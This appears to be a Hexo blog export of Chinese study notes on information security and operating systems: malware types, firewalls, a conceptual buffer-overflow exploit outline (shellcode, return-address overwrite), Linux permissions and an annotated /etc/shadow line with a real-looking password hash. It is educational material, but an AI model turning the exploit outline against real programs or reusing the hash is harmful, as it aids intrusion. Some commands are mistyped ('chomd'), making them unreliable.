title="基于异常的入侵检测技术"></a><strong>基于异常的入侵检测技术</strong></h3><ul><li><strong>定义一组系统正常情况的数值</strong>，然后将系统运行时的数值与所定义的“正常”情况相比，得出是否有被攻击的迹象</li></ul><h1 id="信息系统安全基础"><a href="#信息系统安全基础" class="headerlink" title="信息系统安全基础"></a>信息系统安全基础</h1><h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><p>常见的：</p><ul><li>win32，winxx，系统病毒</li><li>worm蠕虫</li><li>macro宏病毒</li><li>trojan特洛伊木马</li><li><strong>harm破坏性程序病毒</strong></li><li>joke玩笑病毒</li><li><strong>binder捆绑</strong></li><li><strong>dropper种植型病毒</strong></li></ul><h3 id="计算机病毒"><a href="#计算机病毒" class="headerlink" title="计算机病毒"></a>计算机病毒</h3><p>特点：</p><ul><li>程序性</li><li>传播性</li><li>破坏性</li><li>潜伏性</li><li><strong>非授权性</strong></li><li><strong>隐蔽性</strong></li><li><strong>可触发性</strong></li><li><strong>不可预见性</strong></li></ul><p>周期：</p><ul><li>潜伏阶段</li><li>传播</li><li>触发</li><li>发作</li></ul><h3 id="蠕虫worm"><a href="#蠕虫worm" class="headerlink" title="蠕虫worm"></a>蠕虫worm</h3><p>特点：</p><ul><li>自我移动</li><li>自我复制</li></ul><p>例子：</p><ul><li>震网</li></ul><h3 id="特洛伊木马"><a href="#特洛伊木马" class="headerlink" title="特洛伊木马"></a>特洛伊木马</h3><p>指表面上有用、实际目的却是危害计算机安全并导致严重破坏的计算机程序。主要是破坏，不传播</p><p>反弹木马：为了突破防火墙，被控向控制端发起连接</p><h1 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h1><p>防火墙，缓冲区溢出，密码学计算des，rsa，</p><h2 id="防火墙-1"><a href="#防火墙-1" class="headerlink" title="防火墙"></a>防火墙</h2><ul><li>当源端口未指定时，填＞1024</li><li><img src="/2021/11/05/1/image-20211031154732427.png" alt="image-20211031154732427" style="zoom:50%;"></li></ul><h3 id="安全需求描述"><a href="#安全需求描述" class="headerlink" title="安全需求描述"></a>安全需求描述</h3><ul><li>结合防火墙策略描述<ul><li><img src="/2021/11/05/1/image-20211103162156011.png" alt="image-20211103162156011" style="zoom: 50%;"></li></ul></li></ul><h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><h3 id="概念原理"><a href="#概念原理" class="headerlink" title="概念原理"></a>概念原理</h3><ul><li>缓冲区溢出攻击的基本原理:向缓冲区中写入超长的、预设的内容，导致缓冲区溢出，覆盖其他正常的程序或数据，然后让计算机转去运行这行预设的程序，达到执行非法操作、实现攻击的目的。</li><li>这种攻击能够成功主要是利用了程序中<strong>边界条件、函数指针等设计不当</strong>的漏洞</li></ul><h3 id="术语语法"><a href="#术语语法" class="headerlink" title="术语语法"></a>术语语法</h3><ul><li>main函数内三个都是本地静态变量，位于堆栈区</li><li>堆栈：先进后出，push（入栈）和pop（出栈）是基本操作</li><li>先定义的最先压入栈底</li><li>EBP是PE文件执行时候在函数调用时函数调用前<strong>栈底指针</strong></li></ul><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><img src="/2021/11/05/1/image-20211103085626416.png" alt="image-20211103085626416" style="zoom:50%;"><img src="/2021/11/05/1/image-20211103093717013.png" alt="image-20211103093717013" style="zoom:50%;"><ul><li>先定义的变量压入栈底，位于内存高端</li></ul><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>一个缓冲区溢出程序的执行通常由四个步骤组成:</p><p>①准备一个可以<strong>调出一个 shell 的机器码形式的字符串</strong>，称之为 <strong>SHELLCODE</strong></p><p>②申请一个缓冲区，并将<strong>机器码填入缓冲区的低端</strong>。</p><p>③估算机器码在堆栈中的起始位置，并将这个<strong>位置写入缓冲区的高端</strong>。</p><p>④将这个缓冲区作为系统一个有着缓冲区溢出错误的程序的一个入口参数，并执行这个有错误的程序。</p><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><img src="/2021/11/05/1/image-20211103084023752.png" alt="image-20211103084023752" style="zoom: 67%;"><ul><li>在函数 function（） 中，将一个 128 字节 长度的字符串拷贝到只有 16 字节长的局部缓冲区中去，在调用 strccpy（）进行字符串拷贝时没有进行<strong>缓冲区越界检查</strong>。 执行此程序得不到输出”Thisisatest” 。因为程序没有执行到这一步，当程序执行到 function（） 时，子程序执行完毕，应返回到执行 print (“ Thisisatest“）处，但是，由于缓冲区已经溢出，子程序的<strong>返回地址变成了 Ox41414141</strong>，一个显然<strong>还在进程地址空间但 己不是程序正常流程的地址</strong>一一无法预料在这里程序会执行什么指令，但本程序很小， 不会引起严重后果。因为 <strong>Ox41414141 是在主程中对字符串数组赋值时写入的值</strong>，可以设想，假如在主程序中对字符串数组赋值时，将一个有危险指令序列的地址以字符串方式填入在刚好覆盖子程序返回地址的数组位置，那么子程序执行完返回时，就会执行这一段危险指令。</li></ul><h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><ul><li>补丁</li><li>用批准工具：编写安全代码</li><li>禁用危险函数</li><li>静态分析：检测完整性</li></ul><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="重要文件"><a href="#重要文件" class="headerlink" title="重要文件"></a>重要文件</h3><p>用户名文件默认访问权限为 rw- r– r–；口令字文件的默认访问权限为 r– — —。</p><ul><li><img src="/2021/11/05/1/image-20211103155950701.png" alt="image-20211103155950701" style="zoom:67%;"></li><li><img src="/2021/11/05/1/image-20211103160014636.png" alt="image-20211103160014636" style="zoom:67%;"></li></ul><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><ul><li><img src="/2021/11/05/1/image-20211103160108513.png" alt="image-20211103160108513" style="zoom:50%;"></li><li>-rw—— (600) #只有所有者才有读和写的权限 </li><li>-rw-r–r– (644) #只有所有者才有读和写的权限，组群和其他人只有读的权限 </li><li>-rwx—— (700) #只有所有者才有读，写，执行的权限</li><li>-rwxrwxrwx (777) #每个人都有读写和执行的权限</li></ul><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="加密函数选择"><a href="#加密函数选择" class="headerlink" title="加密函数选择"></a>加密函数选择</h3><ul><li>对称加密：密钥管理分发困难，不够安全，无单向性以及抗碰撞性</li><li>HASH加密：单向性，双抗</li></ul><h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><ul><li>加随机数，时间戳，流水号</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络技术基础</title>
      <link href="2021/09/14/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"/>
      <url>2021/09/14/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo</title>
      <link href="2021/09/13/hexo/"/>
      <url>2021/09/13/hexo/</url>
      
        <content type="html"><![CDATA[<pre><code>ssh在gitbash中输入：ssh-keygen -t rsa -C “[youremail@example.com](mailto:youremail@example.com)，生成sshcat id_rsa.pub去github找到setting添加ssh key在gitbash中验证是否添加成功：ssh -T [git@github.com](mailto:git@github.com)安装deploynpm install hexo-deployer-git –savehexo n &quot;我的博客&quot; #新建文章hexo p == hexo publish hexo g == hexo generate #生成hexo s == hexo server #启动服务预览hexo d == hexo deploy #部署 hexo server #Hexo 会监视文件变动并自动更新，无须重启服务器。hexo server -s #静态模式 hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IP*hexo clean #清除缓存 网页正常情况下可以忽略此条命令 hexo g #生成静态网页hexo d #开始部署*hexo generate</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>操作系统</title>
      <link href="2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a>Linux基础</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="常用的系统命令"><a href="#常用的系统命令" class="headerlink" title="常用的系统命令"></a>常用的系统命令</h3><pre><code class="php+HTML">1.pwd #当前位置2.cd .. #返回上一级3.cd + /path/ #穿越到某个路径4.cd - #上一个路径5.ls + /path/ #查看某文件夹下的内容6.ls -l #当前文件夹里的文件信息（不包括子目录）7.ls -lR #文件夹全部文件信息（包括子目录）8.mkdir #新建文件夹9.touch #建立文档10.rm #删除11.echo helloworld &gt; new.txt #将helloworld覆盖写入文档12.echo abc &gt;&gt; new.txt #将abc追加到文档末尾13.cp /path1/2.txt /path2/3.txt #将2.txt从path1复制到path2并命名为3.txt14.cp -r path1/file /path2 #将文件夹file从path1复制到path2不重命名15.mv /path1/2.txt /path2/2.txt #将2.txt从path1复制到path2不重命名16.cat #全部打印到终端17.more #提供翻页查看18.head -n 3 abc.txt #看abc.txt文档的前三行19.ctrl U #清理光标前内容20.ctrl K #清理光标后内容21.tar cvf 2.tar 1.txt #压缩文档22.tar xvf 2.tar #解压缩文档23.which java #查找程序位置</code></pre><h3 id="VIM命令"><a href="#VIM命令" class="headerlink" title="VIM命令"></a>VIM命令</h3><pre><code class="php+HTML">1.Esc键 + ./hello #搜索hello字符串2.Esc键 + :2 #跳到第二行3.dd #删除光标所在行4.ndd #删除光标下n行5.yy #复制行6.Esc键 + set nu #显示行号7.p #粘贴</code></pre><h3 id="Linux用户权限划分命令"><a href="#Linux用户权限划分命令" class="headerlink" title="Linux用户权限划分命令"></a>Linux用户权限划分命令</h3><p><strong>用户组</strong>：具有<strong>相同特征</strong>的用户集合，一个用户可同时在多组</p><pre><code class="php+HTML">1.useradd test  #添加一个叫test的账户2.usermod -g usergroup username #修改账户所属组3.usermod -l newname username #修改账户名4.userdel username #删除账户5.passwd username #给某个账户重置密码6.groups username #查看账户所属组7.more /etc/group #查看主机账户列表8.groupadd groupnanme #添加组9.groupdel groupnanme #删除组</code></pre><h3 id="文件权限命令"><a href="#文件权限命令" class="headerlink" title="文件权限命令"></a>文件权限命令</h3><p>用户<strong>需要一定的权限</strong>才可以操作一个程序，例如执行、打开、读取。</p><ul><li><p><strong>文件权限判断流程</strong></p><ul><li>第一次判断:判断是否为文件<strong>所有者</strong>，如果否，执行第二次判断。</li><li>第二次判断:判断用户是否属于<strong>有权限的组</strong></li><li>如果<strong>两次全为否</strong>则当前用户则没有操作这个文件的权限。</li></ul></li><li><p><strong>文件权限格式</strong></p><ul><li><p><code>-rwxrwxrwx</code></p></li><li><p><strong>r</strong> 表示文件可以被读（read）</p><p><strong>w</strong> 表示文件可以被写（write）</p><p><strong>x</strong> 表示文件可以被执行（如果它是程序的话）</p><ul><li><p>rwx也可以用数字来代替</p><ul><li><p><strong>r</strong> ————4</p><p><strong>w</strong> ———–2</p><p><strong>x</strong> ————1</p><p><strong>-</strong> ————0</p></li></ul></li><li><p>第1位：文件类型（<strong>d目录，-普通文件，l链接文件</strong>）</p></li><li><p>第2-4位：所属用户权限，用u(user)表示</p></li><li><p>第5-7位：所属组权限,用g(group)表示</p></li><li><p>第8-10位：其他用户权限,用o(other)表示</p></li><li><p>第2-10位：表示所有权限，用a(all)表示</p></li></ul></li></ul></li><li><p><strong>符号含义</strong></p><ul><li><code>+</code>号代表添加权限<ul><li><code>chomd +x 1.txt</code> #给1.txt添加执行权限 </li></ul></li><li><code>-</code>号代表剥夺权限<ul><li><code>chomd -x 1.txt</code> #剥夺1.txt的执行权限</li></ul></li></ul></li><li><p><strong>常见的文件权限</strong></p></li><li><pre><code class="php+HTML">-rw—— (600) #只有所有者才有读和写的权限-rw-r–r– (644) #只有所有者才有读和写的权限，组群和其他人只有读的权限-rwx—— (700) #只有所有者才有读，写，执行的权限-rwxr-xr-x (755) #只有所有者才有读，写，执行的权限，组只有读和执行的权限，其他人只有执行的权限-rwx–x–x (711) #只有所有者才有读，写，执行的权限，组群和其他人只有执行的权限-rw-rw-rw- (666) #每个人都有读写的权限-rwxrwxrwx (777) #每个人都有读写和执行的权限“755”构成:&quot;0&quot;表示没有权限、“1”表示可执行权限、“2”表示可写权限、“4”表示可读权限。“7=1+2+4，5=1+4”</code></pre></li><li><p><strong>更改文件权限命令</strong></p></li></ul><pre><code class="php+HTML">1.chomd +x #添加执行权限 2.chmod -x #去除执行权限3.chmod u(当前用户)/o(其他用户) + x #给当前/其他用户执行权限</code></pre><h3 id="目录权限命令"><a href="#目录权限命令" class="headerlink" title="目录权限命令"></a>目录权限命令</h3><ul><li>文件如果拥有x（执行权限）则代表可以用<code>cd</code>命令进入该目录</li></ul><pre><code class="php+HTML">1.chown user:usergroup 1 #修改1文件的所有者,组2.chown -R user:usergroup filename #使用-R递归修改文件目录里面的子文件权限，只改了文件的权限，并不会修改文件里文档的权限</code></pre><h2 id="密码文件"><a href="#密码文件" class="headerlink" title="密码文件"></a>密码文件</h2><h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><ul><li>所有用户都能查看</li><li>文件内容</li><li><code>root:x:0:0:root:/root:/bin/bash</code> <ul><li>1、账号名称</li><li>2、原先用来保存密码的，现在密码都放在/etc/shadow中，所以这里显示x</li><li>3、UID，使用者ID。默认的系统管理员的UID为0，我们添加用户的时候最好使用1000以上的UID，1-1000范围的UID最好保留给系统用。</li><li>4、GID，也就是群组ID</li><li>5、关于账号的一些说明信息</li><li>6、账号的家目录，家目录就是你登陆系统后默认的那个目录</li><li>7、账号使用的shell</li></ul></li></ul><h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><ul><li>只有root可以查看</li><li>文件内容<ul><li><code>slave1:$1$chN84aE2$tjv1V0qZm4WlO14WAAo0Z0:18782:0:99999:7:2::</code> <ul><li>1、账户名称</li><li>2、加密后的密码。如果这一栏的第一个字符为!或者*的话，说明这是一个不能登录的账户。eg:<code>daemon:*:15259:0:99999:7:2::</code></li><li>3、最近改动密码的日期,从1970年1月1日算起,换算:<code> date -d &quot;1970-01-01 18782 days&quot;</code></li><li>4、修改密码最小间隔时间。如果是 0，则密码可以随时修改；如果是 10，则代表密码修改后 10 天之内不能再次修改密码</li><li>5、密码需要重新变更的天数。该用户的密码会在设定天数后过期，如果为99999则没有限制</li><li>6、密码过期预警天数。如果在5中设置了密码需要重新变更的天数，则会在密码过期的前7天进行提醒</li><li>7、密码过期的宽恕时间：如果在5中设置的日期过后，用户仍然没有修改密码，则该用户还可以继续使用2天</li><li>8、账号失效日期，过了这个日期账号就不能用了，从1970年1月1日算起</li></ul></li></ul></li></ul><h2 id="Linux-文件系统"><a href="#Linux-文件系统" class="headerlink" title="Linux 文件系统"></a>Linux 文件系统</h2><h3 id="Linux文件系统结构"><a href="#Linux文件系统结构" class="headerlink" title="Linux文件系统结构"></a>Linux文件系统结构</h3><p>​    <strong>Virtual File System(虚拟文件系统VFS)</strong>:衔接<u>各种各样的文件系统</u>，VFS在用户和文件系统之间<strong>提供了一个交换层</strong>，用户和进程不需要知道文件所在的文件系统类型。隐藏了各种硬件的具体细节，把文件系统操作和不同文件系统的具体实现细节分离了开来。为所有的设备提供了统一的接口。</p><p><strong>Buffer Cache(缓冲区缓存)</strong>:将数据保留一段时间（或者随即预先读取数据以便在需要时就可用）优化了对物理设备的访问。</p><p><strong>Device Drivers(设备驱动程序)</strong>:控制操作系统和硬件设备之间的交互。</p><p><strong>Network Interface (网络接口)</strong>:提供了对各种网络标准的存取和各种网络硬件的支持。</p><p><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/v2-212ca855ac2dad87983b23b6539e21ce_1440w.jpg" alt="Linux文件系统结构"></p><p>​                                                                                                       </p><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/v2-b92499b17ed11bc279689ecdb6efb4b6_b.jpg" alt="Linux文件系统结构" style="zoom: 67%;"><p>​                                         </p><h3 id="Linux文件系统"><a href="#Linux文件系统" class="headerlink" title="Linux文件系统"></a>Linux文件系统</h3><ul><li>ext：第一代的 ext 文件系统，由于它原始的时间戳（每个文件仅有一个时间戳）仅仅一年后，ext2 就替代了它。</li><li>ext2 ：早期linux中常用的文件系统,如果在将数据写入到磁盘的时候，系统发生崩溃或断电，则容易发生灾难性的数据损坏.</li><li>ext3 ：ext2的升级版，带日志功能。日志是磁盘上的一种特殊的分配区域，其写入被存储在事务中。<ul><li>日志的应用<ul><li>如果该事务完成磁盘写入，则日志中的数据将提交给文件系统自身。</li><li>如果系统在该操作<strong>提交前崩溃</strong>，则重新启动的系统识别其为未完成的事务而将其进行<strong>回滚</strong>，就像从未发生过一样。正在处理的文件可能依然会丢失，但<strong>文件系统本身保持一致</strong>，且其它所有数据都是安全的。</li></ul></li><li>ext3 文件系统的 Linux 内核中实现了三个级别的日志记录方式： <strong>日记(journal)、 顺序(ordered)和 回写(writeback)</strong><ul><li><strong>日记(journal)</strong>:最低风险模式，<u>在将数据和元数据提交给文件系统之前将其写入日志。这可以保证正在写入的文件与整个文件系统的一致性</u>，但其显著降低了性能。</li><li><strong>顺序(ordered)</strong>:顺序模式将<strong>元数据写入日志</strong>而<strong>直接将数据提交到文件系统</strong>。这里的操作顺序是固定的，这么做可以减少数据回滚量。<ul><li>元数据提交到日志；</li><li>数据写入文件系统；</li><li>将日志中关联的元数据更新到文件系统</li></ul></li><li><strong>回写(writeback)</strong>:最不安全的日志模式。元数据会被记录到日志，但数据不会。<u>元数据和数据都可以以任何有利于获得最佳性能的顺序写入</u>。虽然显著提高性能，但安全性低很多。在崩溃或崩溃之前写入的文件很容易丢失或损坏。</li></ul></li></ul></li><li>ext4 ：linux常用文件系统格式，支持大文件系统，提高了对碎片的抵抗力，有更高的性能以及更好的时间戳。<ul><li>ext3 和 ext4的差别：<ul><li>兼容性。允许 ext3 文件系统原地升级到 ext4；允许ext4 驱动程序以ext3 模式自动挂载ext3 文件系统</li><li>寻址地址。ext3 文件系统使用 32 位寻址，ext4 使用 48 位的内部寻址</li><li>性能更好。</li></ul></li></ul></li></ul><h3 id="Linux文件类型"><a href="#Linux文件类型" class="headerlink" title="Linux文件类型"></a>Linux文件类型</h3><ol><li><strong>普通文件（-）</strong><ul><li>从Linux的角度来说，类似mp4、pdf、html这样应用层面上的文件类型都属于普通文件</li></ul></li><li><strong>目录文件（d，directory file）</strong></li><li><strong>符号链接（l，symbolic link）</strong><ul><li>这种类型的文件类似Windows中的快捷方式，是指向另一个文件的间接指针，也就是常说的软链接</li></ul></li><li><strong>块设备文件（b，block）</strong>和<strong>字符设备文件（c，char）</strong><ul><li>这些文件一般隐藏在/dev目录下，在进行设备读取和外设交互时会被使用到</li><li>比如磁盘光驱就是块设备文件，串口设备则属于字符设备文件</li><li>系统中的所有设备要么是块设备文件，要么是字符设备文件</li></ul></li><li><strong>管道(FIFO)文件（p，pipe）</strong><ul><li>管道文件主要用于进程间通讯。比如使用<code>mkfifo</code>命令可以创建一个FIFO文件，启用一个进程A从FIFO文件里读数据，启动进程B往FIFO里写数据</li></ul></li><li><strong>套接字（s，socket）</strong><ul><li>用于进程间的网络通信，也可以用于本机之间的非网络通信</li></ul></li></ol><h3 id="Linux文件目录"><a href="#Linux文件目录" class="headerlink" title="Linux文件目录"></a>Linux文件目录</h3><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/v2-b90ccc05d3a17b7bf30e4528faf96f4a_1440w.jpg" alt="Linux文件目录" style="zoom:33%;"><h3 id="Linux文件系统特性"><a href="#Linux文件系统特性" class="headerlink" title="Linux文件系统特性"></a>Linux文件系统特性</h3><p>​     <img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/v2-9d77e25913894df26b0374ceae25c605_b.jpg" alt="索引节点、目录项以及文件数据关系图"></p><p><strong>Linux读取一个文件的流程</strong>:</p><p><u>1.先读取这个文件inode块里面存放的所有索引号码。</u></p><p><u>2.按照号码去寻找对应的block块。</u></p><p><u>3.最后读取block块里面的内容。</u>              </p><p><em>就像一本书有封面、目录和正文一样。在文件系统中，超级块就相当于封面，从封面可以得知这本书的基本信息；inode 块相当于目录，从目录可以得知各章节内容的位置；而数据块则相当于书的正文，记录着具体内容。</em></p><p><strong>前置知识</strong></p><ol><li>在Linux中，一个文件分为<strong>两个部分</strong>。一个是文件的权限和属性，另外一个是文件的具体内容。这两者分别存放在<strong>inode</strong>块和<strong>block</strong>块中。<ul><li><strong>每个block块都有一个索引号码</strong>，这个索引号码会被记录在inode里面</li><li><strong>索引节点（ inode）</strong>它是文件系统的最基本单元，是文件系统连接任何子目录、任何文件的<strong>桥梁</strong>。用来记录文件的元信息，比如 inode 编号、文件大小、访问权限、创建时间、修改时间、<strong>数据在磁盘的位置</strong>等等。索引节点是文件的<strong>唯一</strong>标识，它们之间<strong>一一对应</strong>，会被存储在硬盘中，所以<strong>索引节点同样占用磁盘空间</strong>。</li></ul></li><li>为了减少读盘次数，内核缓存了目录的树状结构，称为<strong>dentry cache</strong>。<strong>dentry cache</strong>只保存<strong>最近访问</strong>过的目录项，如果要找的目录项在cache中没有，就要从磁盘读到内存中。</li></ol><p><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/v2-d9e36f97b24b2a7f760a81d0b095c36d_b.jpg" alt="块分布图"></p><p><strong>引导块</strong>：在系统启动时用于启用引导<br><strong>超级块</strong>:包含整个文件系统的<strong>基本信息</strong>。如块大小，inode/block的总量、使用量、剩余量，指向空间 inode 和数据块的指针等相关信息<br><strong>块组描述符</strong>:包含文件系统中<strong>各个块组</strong>的状态。比如块组中空闲块和 inode 的数目等<br><strong>数据位图和 inode 位图</strong>：用于表示对应的数据块或 inode 状态<br><strong>inode table</strong>:包含了所有的 inode<br><strong>数据块</strong>:实际记录文件的内容。若文件太大时，会占用多个block</p><p><strong>例子</strong>:读取2.txt这个文本文件，它的路径是<code>/root/1/2.txt</code></p><ul><li><p>1.根据inode查找文件:</p><ul><li><p>查找根目录“/”</p></li><li><p>查找/root/文件夹</p></li><li><p>查找/root/1/文件夹</p></li><li><p>查找/root/1/2.txt文本文件</p></li><li><pre><code class="php+HTML">[root@slave1 1]# ls -dil / /root/ /root/1/ /root/1/2     64 dr-xr-xr-x. 17 root root 224 6月   4 01:24 / #先读取根目录“/”，根目录即挂载点的inode号码是648409153 dr-xr-x---.  7 root root 277 8月  17 23:18 /root/ #通过编号为64的inode块找到/root/对应的block块，返回/root/对应的inode号码是8409153。7073042 drwxr-xr-x.  2 root root  15 8月  17 20:57 /root/1/ #通过编号为8409153的inode块来找到/root/1/对应block块，返回/root/1/对应的inode号码是7073042。   7073049 -rw-r--r--.  1 root root  11 8月  17 20:55 /root/1/2  #通过编号为7073042的inode块来找到/root/1/2.txt对应block块，返回/root/1/2.txt对应的inode号码是7073049。</code></pre></li><li><p>最后在7073049这个inode中找到2.txt</p></li></ul></li><li><p>2.读取文件</p><ul><li>从inode找到所有block块的索引号</li><li>根据索引号找到block块</li><li>读取具体内容     </li></ul></li></ul><p><strong>硬链接</strong>:一般情况下，文件名和inode号码是”一一对应”关系，每个inode号码对应一个文件名。但是，Linux系统允许，多个文件名指向同一个inode号码。A,B互不干涉</p><ul><li><code>ln &lt;源文件B&gt;&lt;新文件A&gt;</code> </li></ul><p><strong>软链接(符号连接)</strong>:文件A和文件B的inode号码虽然不一样，但是文件A的内容是文件B的路径。读取文件A时，系统会自动将访问者导向文件B。如果删除了B，A失效。</p><ul><li><code>ln -s &lt;源文件B&gt;&lt;新文件A&gt;</code> </li></ul><p><strong>硬链接和软链接的区别</strong>:</p><ol><li>硬链接原文件和新文件的inode编号一致。而软链接不一样。</li><li>对原文件删除，会导致软链接不可用，而硬链接不受影响。</li><li>对原文件的修改，软、硬链接文件内容也一样的修改。</li></ol><h2 id="Linux的引导和启动"><a href="#Linux的引导和启动" class="headerlink" title="Linux的引导和启动"></a>Linux的引导和启动</h2><p>操作系统的启动分为两个阶段：<strong>引导和启动</strong>。<br>引导阶段:开始于打开电源或者重启，结束于内核初始化完成和 <strong>systemd</strong> 进程成功运行。<br>启动阶段:开始于引导阶段结束，结束于操作系统进入可操作状态。</p><h3 id="引导过程"><a href="#引导过程" class="headerlink" title="引导过程"></a>引导过程</h3><ul><li><strong>BIOS 上电自检（POST）</strong></li><li><strong>引导装载程序 (GRUB2)</strong></li><li><strong>内核初始化</strong></li><li><strong>启动 systemd，其是所有进程之父</strong></li></ul><h4 id="BIOS-上电自检（POST）"><a href="#BIOS-上电自检（POST）" class="headerlink" title="BIOS 上电自检（POST）"></a>BIOS 上电自检（POST）</h4><ul><li>上电自检主要由<u>硬件部分</u>来完成。</li><li>BIOS 上电自检<ul><li><u>确认硬件的功能正常</u></li><li>查找引导扇区</li><li>有效引导记录的<u>第一个引导扇区被装载到内存</u>中，并且<strong>控制权</strong>也转移到此段代码。</li></ul></li></ul><h4 id="引导装载程序-GRUB2"><a href="#引导装载程序-GRUB2" class="headerlink" title="引导装载程序 (GRUB2)"></a>引导装载程序 (GRUB2)</h4><p><strong>GRUB2</strong> 是一个用于计算机<u>寻找内核并加载其到内存</u>的程序。</p><p>1.BIOS 查找<strong>MBR（主引导记录）</strong><br>2.加载 Linux 内核到内存，<u>转移控制权到内核</u><br>3.内核(压缩格式)自解压完成，则加载 <strong>systemd</strong>进程并转移控制权到 <strong>systemd</strong><br>4.<strong>systemd</strong>启动，引导过程的结束。此刻，Linux 内核和 systemd 处于运行状态</p><h3 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h3><p><em>启动过程使 Linux 系统进入可操作状态，并能够执行用户功能性任务。</em></p><h4 id="启动systemd"><a href="#启动systemd" class="headerlink" title="启动systemd"></a>启动systemd</h4><p><strong>systemd</strong> 是所有进程的父进程，它负责将 Linux 主机带到一个<em>用户可操作状态（可以执行功能任务</em>）。</p><ul><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/3.jpg" alt="逐级启动" style="zoom:50%;"></li><li>在 <code>sysinit.target</code> 的条件满足以后，<strong>systemd</strong> 接下来启动 <code>basic.target</code>，启动其所要求的所有单元。 </li><li>用户级目标态（<code>multi-user.target</code> 或 <code>graphical.target</code>） 初始化。<ul><li><code>multi-user.target</code> 必须在图形化目标态 <code>graphical.target</code> 之前先达成。</li></ul></li></ul><h4 id="启动完成标志"><a href="#启动完成标志" class="headerlink" title="启动完成标志"></a>启动完成标志</h4><p>以 <code>*</code> 开头的目标态是通用的启动状态，说明系统已经启动完成。eg: <code>*graphical.target</code> or <code>*multi-user.target</code></p><ul><li>如果 <code>multi-user.target</code> 是默认的目标态，则系统以命令行登录界面呈现于用户。</li><li>如果 <code>graphical.target</code> 是默认的目标态，则系统以图形登录界面呈现于用户。</li></ul><h1 id="Windows基础"><a href="#Windows基础" class="headerlink" title="Windows基础"></a>Windows基础</h1><h2 id="Windows引导和启动"><a href="#Windows引导和启动" class="headerlink" title="Windows引导和启动"></a>Windows引导和启动</h2><p>目前主要的系统引导方式有两种：<br>1.<strong>传统BIOS + MBR</strong><br>2.<strong>新型UEFI + GPT</strong></p><p><u>UEFI BIOS可同时识别MBR分区和GPT分区</u>，所以MBR和GPT磁盘都可用于启动操作系统。<em>但是UEFI只能将系统安装在GPT磁盘中</em>。<br><strong>UEFI</strong>:微型操作系统，能够识别FAT文件系统，运行efi程序。</p><h3 id="传统BIOS-MBR"><a href="#传统BIOS-MBR" class="headerlink" title="传统BIOS + MBR"></a>传统BIOS + MBR</h3><p><img src="https://pic2.zhimg.com/80/v2-151011877000bb57b29c0c86576a5691_1440w.jpg" alt="传统BIOS + MBR"></p><p>1.上电，执行Legacy BIOS.<br>2.进行POST自检，完成硬件初始化。<br>3.查找<u>MBR中的IPL</u>（用于确定活动主分区），找到<strong>IPL</strong>的<u>引导扇区（位于第一个扇区）中的引导记录（PBR）</u>，<u>载入</u>PBR<em>中的启动管理器</em>（<code>bootmgr.exe</code>或<code>NTLDR</code>）。<br>4.<strong>bootmgr.exe</strong><u>读取IPL根目录下</u>boot文件夹里的<u>启动设置文件（BCD或boot.ini）</u>，然后<u>载入程序winload.exe</u>（位置：C:\Windows\system32\winload.exe）来<u>加载OS内核</u>。<br>5.内核程序执行系统初始化。</p><h3 id="新型UEFI-GPT"><a href="#新型UEFI-GPT" class="headerlink" title="新型UEFI + GPT"></a>新型UEFI + GPT</h3><p><img src="https://pic2.zhimg.com/80/v2-c6d908835871f938fe71c783b4cc8e01_1440w.jpg" alt="新型UEFI + GPT"></p><p>1.开机，执行UEFI BIOS。<br>2.UEFI BIOS先<u>直接初始化CPU和内存</u>，CPU和内存若有问题则直接黑屏，其后启动<strong>PXE</strong>采用枚举方式搜索各种硬件并加载驱动，完成硬件初始化。<br>3.从EFI分区(不一定第一个扇区)找到、读入、执行<u>启动管理器</u>（\efi\Microsoft\boot\bootmgfw.efi）。<br>4.<code>bootmgfw.efi</code>导入EFI分区<strong>BCD</strong>文件（efi\Microsoft\BCD），然后<u>载入程序winload.efi</u>（位置：C:\Windows\system32\winload.efi）来<u>加载OS内核</u>。</p><p>Tips：BCD是一个数据库文件，如果包含多个系统，信息会包含在BCD中，通过显示一个系统列表供用户选择。</p><h2 id="Windows用户管理"><a href="#Windows用户管理" class="headerlink" 